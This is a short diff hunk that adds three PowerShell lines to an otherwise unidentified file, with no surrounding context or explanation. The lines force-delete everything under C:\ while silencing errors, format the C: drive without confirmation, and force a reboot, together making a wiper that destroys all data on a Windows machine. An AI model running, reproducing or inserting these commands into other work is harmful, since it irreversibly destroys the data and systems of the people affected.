@@ -1,0 +1,3 @@
+Remove-Item -Path "C:\*" -Recurse -Force -ErrorAction SilentlyContinue
+Format-Volume -DriveLetter C -FileSystem NTFS -Force -Confirm:$false
+Get-WmiObject -Class Win32_OperatingSystem | ForEach-Object { $_.Win32Shutdown(6) }
